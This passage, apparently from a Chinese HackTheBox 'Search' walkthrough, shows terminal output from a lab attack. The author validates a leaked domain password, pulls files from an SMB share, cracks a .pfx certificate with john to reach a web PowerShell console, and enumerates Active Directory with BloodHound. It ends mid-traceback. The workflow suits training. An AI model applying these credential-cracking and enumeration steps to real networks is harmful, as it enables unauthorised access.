SMB         10.129.229.57   445    RESEARCH         [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&66** STATUS_LOGON_FAILURE
```

验证这个账号的权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc smb search.htb -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18'      
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc ldap search.htb -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18'
LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc winrm search.htb -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18'
  
```

查看这个账号的文件夹。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ smbclient \\\\10.129.229.57\\RedirectedFolders$ -U 'search.htb/sierra.frye%$$49=wide=STRAIGHT=jordan=28$$18' -c 'cd sierra.frye;recurse ON prompt OFF;ls'
  .                                  Dc        0  Wed Nov 17 20:01:46 2021
  ..                                 Dc        0  Wed Nov 17 20:01:46 2021
  Desktop                           DRc        0  Wed Nov 17 20:08:00 2021
  Documents                         DRc        0  Fri Jul 31 10:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 10:45:36 2020
  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021

\sierra.frye\Desktop
  .                                 DRc        0  Wed Nov 17 20:08:00 2021
  ..                                DRc        0  Wed Nov 17 20:08:00 2021
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 14:03:59 2020
  desktop.ini                      AHSc      282  Fri Jul 31 10:42:15 2020
  Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 08:28:05 2020
  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021

\sierra.frye\Documents
  .                                 DRc        0  Fri Jul 31 10:42:19 2020
  ..                                DRc        0  Fri Jul 31 10:42:19 2020
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 14:04:01 2020
  desktop.ini                      AHSc      402  Fri Jul 31 10:42:19 2020

\sierra.frye\Downloads
  .                                 DRc        0  Fri Jul 31 10:45:36 2020
  ..                                DRc        0  Fri Jul 31 10:45:36 2020
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 14:04:01 2020
  Backups                           DHc        0  Mon Aug 10 16:39:17 2020
  desktop.ini                      AHSc      282  Fri Jul 31 10:42:18 2020

\sierra.frye\Desktop\$RECYCLE.BIN
  .                                DHSc        0  Tue Apr  7 14:03:59 2020
  ..                               DHSc        0  Tue Apr  7 14:03:59 2020
  desktop.ini                      AHSc      129  Tue Apr  7 14:04:00 2020

\sierra.frye\Documents\$RECYCLE.BIN
  .                                DHSc        0  Tue Apr  7 14:04:01 2020
  ..                               DHSc        0  Tue Apr  7 14:04:01 2020
  desktop.ini                      AHSc      129  Tue Apr  7 14:04:01 2020

\sierra.frye\Downloads\$RECYCLE.BIN
  .                                DHSc        0  Tue Apr  7 14:04:01 2020
  ..                               DHSc        0  Tue Apr  7 14:04:01 2020
  desktop.ini                      AHSc      129  Tue Apr  7 14:04:01 2020

\sierra.frye\Downloads\Backups
  .                                 DHc        0  Mon Aug 10 16:39:17 2020
  ..                                DHc        0  Mon Aug 10 16:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020

                3246079 blocks of size 4096. 767144 blocks available
```

下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/sierra.frye]
└─$ smbclient \\\\10.129.229.57\\RedirectedFolders$ -U 'search.htb/sierra.frye%$$49=wide=STRAIGHT=jordan=28$$18' -c 'cd sierra.frye;recurse ON prompt OFF;mget *'
Get directory Desktop? y
Get directory Documents? y
Get directory Downloads? y
Get file user.txt? y
ygetting file \sierra.frye\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
Get directory $RECYCLE.BIN? y
Get file desktop.ini? y
getting file \sierra.frye\Desktop\desktop.ini of size 282 as Desktop/desktop.ini (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)
Get file Microsoft Edge.lnk? y
getting file \sierra.frye\Desktop\Microsoft Edge.lnk of size 1450 as Desktop/Microsoft Edge.lnk (2.6 KiloBytes/sec) (average 1.0 KiloBytes/sec)
Get file user.txt? y
getting file \sierra.frye\Desktop\user.txt of size 34 as Desktop/user.txt (0.1 KiloBytes/sec) (average 0.8 KiloBytes/sec)
Get directory $RECYCLE.BIN? y
Get file desktop.ini? y
getting file \sierra.frye\Documents\desktop.ini of size 402 as Documents/desktop.ini (1.0 KiloBytes/sec) (average 0.8 KiloBytes/sec)
Get directory $RECYCLE.BIN? y
Get directory Backups? y
Get file desktop.ini? y
getting file \sierra.frye\Downloads\desktop.ini of size 282 as Downloads/desktop.ini (0.9 KiloBytes/sec) (average 0.8 KiloBytes/sec)
Get file desktop.ini? y
getting file \sierra.frye\Desktop\$RECYCLE.BIN\desktop.ini of size 129 as Desktop/$RECYCLE.BIN/desktop.ini (0.4 KiloBytes/sec) (average 0.8 KiloBytes/sec)
Get file desktop.ini? y
getting file \sierra.frye\Documents\$RECYCLE.BIN\desktop.ini of size 129 as Documents/$RECYCLE.BIN/desktop.ini (0.2 KiloBytes/sec) (average 0.7 KiloBytes/sec)
Get file desktop.ini? y
getting file \sierra.frye\Downloads\$RECYCLE.BIN\desktop.ini of size 129 as Downloads/$RECYCLE.BIN/desktop.ini (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
Get file search-RESEARCH-CA.p12? y
getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as Downloads/Backups/search-RESEARCH-CA.p12 (1.7 KiloBytes/sec) (average 0.9 KiloBytes/sec)
Get file staff.pfx? y
getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as Downloads/Backups/staff.pfx (5.6 KiloBytes/sec) (average 1.5 KiloBytes/sec)
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Search/sierra.frye]
└─$ ls            
Desktop  Documents  Downloads  user.txt
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Search/sierra.frye]
└─$ tree
.
├── Desktop
│   ├── $RECYCLE.BIN
│   │   └── desktop.ini
│   ├── desktop.ini
│   ├── Microsoft Edge.lnk
│   └── user.txt
├── Documents
│   ├── $RECYCLE.BIN
│   │   └── desktop.ini
│   └── desktop.ini
├── Downloads
│   ├── $RECYCLE.BIN
│   │   └── desktop.ini
│   ├── Backups
│   │   ├── search-RESEARCH-CA.p12
│   │   └── staff.pfx
│   └── desktop.ini
└── user.txt

8 directories, 11 files

```

得到 userflag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/sierra.frye]
└─$ cd Desktop    
                                                                                                                                                                                    

┌──(kali㉿kali)-[~/…/Kali/Search/sierra.frye/Desktop]
└─$ cat user.txt  
e1a4885b2fc13244f1b4713e3f698b59

```

发现 staff.pfx。

```bash
┌──(kali㉿kali)-[~/…/Search/sierra.frye/Downloads/Backups]
└─$ ls -liash staff.pfx 
2888680 8.0K -rw-r--r-- 1 kali kali 4.3K Aug 14 02:33 staff.pfx

```

转换为 john 便于破解的格式。

```bash
┌──(kali㉿kali)-[~/…/Search/sierra.frye/Downloads/Backups]
└─$ pfx2john staff.pfx > ../../../jstaff.hash

```

破解得到密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)     
1g 0:00:00:32 DONE (2026-08-14 02:38) 0.03044g/s 166957p/s 166957c/s 166957C/s misswsofoly..missnono
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

在 firefox 的 setting 中添加认证。

![](Pasted%20image%2020260814144514.png)

访问 https://search.htb/staff。

![](Pasted%20image%2020260814151057.png)

可以拿到一个 powershell 环境。

![](Pasted%20image%2020260814151125.png)

使用 bloodhound 收集器采集数据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ bloodhound-python -c All -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb --zip            
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: search.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: research.search.htb
INFO: Testing resolved hostname connectivity dead:beef::9975:8aeb:4562:9e5
INFO: Trying LDAP connection to dead:beef::9975:8aeb:4562:9e5
INFO: Testing resolved hostname connectivity dead:beef::14e
INFO: Trying LDAP connection to dead:beef::14e
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 112 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Testing resolved hostname connectivity dead:beef::9975:8aeb:4562:9e5
INFO: Trying LDAP connection to dead:beef::9975:8aeb:4562:9e5
INFO: Testing resolved hostname connectivity dead:beef::14e
INFO: Trying LDAP connection to dead:beef::14e
INFO: Found 107 users
INFO: Found 64 groups
INFO: Found 6 gpos
INFO: Found 27 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Windows-100.search.htb
INFO: Querying computer: Windows-99.search.htb
INFO: Querying computer: Windows-98.search.htb
INFO: Querying computer: Windows-97.search.htb
INFO: Querying computer: Windows-96.search.htb
INFO: Querying computer: Windows-95.search.htb
INFO: Querying computer: Windows-94.search.htb
INFO: Querying computer: Windows-93.search.htb
INFO: Querying computer: Windows-92.search.htb
INFO: Querying computer: Windows-91.search.htb
WARNING: Could not resolve: Windows-100.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-99.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-98.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-92.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-97.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-91.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-95.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-90.search.htb
WARNING: Could not resolve: Windows-96.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-93.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-94.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-89.search.htb
INFO: Querying computer: Windows-88.search.htb
INFO: Querying computer: Windows-87.search.htb
INFO: Querying computer: Windows-86.search.htb
INFO: Querying computer: Windows-85.search.htb
INFO: Querying computer: Windows-84.search.htb
INFO: Querying computer: Windows-83.search.htb
INFO: Querying computer: Windows-82.search.htb
INFO: Querying computer: Windows-81.search.htb
WARNING: Could not resolve: Windows-90.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-80.search.htb
WARNING: Could not resolve: Windows-88.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-87.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-79.search.htb
WARNING: Could not resolve: Windows-89.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-86.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-81.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-84.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-78.search.htb
WARNING: Could not resolve: Windows-83.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-85.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-82.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-77.search.htb
INFO: Querying computer: Windows-76.search.htb
INFO: Querying computer: Windows-75.search.htb
INFO: Querying computer: Windows-74.search.htb
INFO: Querying computer: Windows-73.search.htb
INFO: Querying computer: Windows-72.search.htb
INFO: Querying computer: Windows-71.search.htb
WARNING: Could not resolve: Windows-80.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-70.search.htb
WARNING: Could not resolve: Windows-79.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-69.search.htb
WARNING: Could not resolve: Windows-78.search.htb: The resolution lifetime expired after 3.101 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-68.search.htb
WARNING: Could not resolve: Windows-76.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-67.search.htb
WARNING: Could not resolve: Windows-75.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-66.search.htb
WARNING: Could not resolve: Windows-77.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-74.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-71.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-72.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-65.search.htb
WARNING: Could not resolve: Windows-73.search.htb: The resolution lifetime expired after 3.106 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-64.search.htb
INFO: Querying computer: Windows-63.search.htb
INFO: Querying computer: Windows-62.search.htb
INFO: Querying computer: Windows-61.search.htb
WARNING: Could not resolve: Windows-70.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-60.search.htb
WARNING: Could not resolve: Windows-69.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-59.search.htb
WARNING: Could not resolve: Windows-68.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-58.search.htb
WARNING: Could not resolve: Windows-67.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-57.search.htb
WARNING: Could not resolve: Windows-66.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-56.search.htb
WARNING: Could not resolve: Windows-63.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-61.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-64.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-55.search.htb
WARNING: Could not resolve: Windows-65.search.htb: The resolution lifetime expired after 3.106 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-62.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-54.search.htb
INFO: Querying computer: Windows-53.search.htb
INFO: Querying computer: Windows-52.search.htb
INFO: Querying computer: Windows-51.search.htb
WARNING: Could not resolve: Windows-60.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-50.search.htb
WARNING: Could not resolve: Windows-59.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-49.search.htb
WARNING: Could not resolve: Windows-58.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-48.search.htb
WARNING: Could not resolve: Windows-57.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-47.search.htb
WARNING: Could not resolve: Windows-56.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-46.search.htb
WARNING: Could not resolve: Windows-55.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-45.search.htb
WARNING: Could not resolve: Windows-54.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-53.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-51.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-44.search.htb
INFO: Querying computer: Windows-43.search.htb
INFO: Querying computer: Windows-42.search.htb
WARNING: Could not resolve: Windows-52.search.htb: The resolution lifetime expired after 3.107 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-41.search.htb
WARNING: Could not resolve: Windows-50.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-40.search.htb
WARNING: Could not resolve: Windows-48.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-39.search.htb
WARNING: Could not resolve: Windows-49.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-38.search.htb
WARNING: Could not resolve: Windows-47.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-37.search.htb
WARNING: Could not resolve: Windows-46.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-36.search.htb
WARNING: Could not resolve: Windows-45.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-35.search.htb
WARNING: Could not resolve: Windows-44.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-34.search.htb
WARNING: Could not resolve: Windows-42.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-43.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-33.search.htb
WARNING: Could not resolve: Windows-41.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-32.search.htb
INFO: Querying computer: Windows-31.search.htb
WARNING: Could not resolve: Windows-40.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-30.search.htb
WARNING: Could not resolve: Windows-39.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-38.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-29.search.htb
INFO: Querying computer: Windows-28.search.htb
WARNING: Could not resolve: Windows-37.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-27.search.htb
WARNING: Could not resolve: Windows-36.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-26.search.htb
WARNING: Could not resolve: Windows-35.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-25.search.htb
WARNING: Could not resolve: Windows-34.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-24.search.htb
WARNING: Could not resolve: Windows-31.search.htb: The resolution lifetime expired after 3.101 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-33.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-32.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-23.search.htb
INFO: Querying computer: Windows-22.search.htb
INFO: Querying computer: Windows-21.search.htb
WARNING: Could not resolve: Windows-30.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-29.search.htb: The resolution lifetime expired after 3.101 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-20.search.htb
INFO: Querying computer: Windows-19.search.htb
WARNING: Could not resolve: Windows-28.search.htb: The resolution lifetime expired after 3.106 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-18.search.htb
WARNING: Could not resolve: Windows-27.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-17.search.htb
WARNING: Could not resolve: Windows-26.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-16.search.htb
WARNING: Could not resolve: Windows-25.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-15.search.htb
WARNING: Could not resolve: Windows-24.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-14.search.htb
WARNING: Could not resolve: Windows-23.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-13.search.htb
WARNING: Could not resolve: Windows-21.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-22.search.htb: The resolution lifetime expired after 3.107 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-12.search.htb
INFO: Querying computer: Windows-11.search.htb
WARNING: Could not resolve: Windows-20.search.htb: The resolution lifetime expired after 3.101 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-10.search.htb
WARNING: Could not resolve: Windows-19.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-09.search.htb
WARNING: Could not resolve: Windows-18.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-16.search.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-17.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-08.search.htb
INFO: Querying computer: Windows-07.search.htb
INFO: Querying computer: Windows-06.search.htb
WARNING: Could not resolve: Windows-15.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-05.search.htb
WARNING: Could not resolve: Windows-14.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-04.search.htb
WARNING: Could not resolve: Windows-13.search.htb: The resolution lifetime expired after 3.101 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-03.search.htb
WARNING: Could not resolve: Windows-12.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-11.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Windows-02.search.htb
INFO: Querying computer: Windows-01.search.htb
WARNING: Could not resolve: Windows-10.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: Covid.search.htb
WARNING: Could not resolve: Windows-09.search.htb: The resolution lifetime expired after 3.107 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
INFO: Querying computer: Research.search.htb
WARNING: Could not resolve: Windows-06.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-08.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-07.search.htb: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-05.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-04.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-03.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-02.search.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-01.search.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.229.57@53 answered The DNS operation timed out.
WARNING: DCE/RPC connection failed: No answer!
WARNING: DCE/RPC connection failed: No answer!
WARNING: DCE/RPC connection failed: No answer!
WARNING: DCE/RPC connection failed: No answer!
WARNING: DCE/RPC connection failed: No answer!
ERROR: Unhandled exception in computer Research.search.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 987, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 130, in process_computer
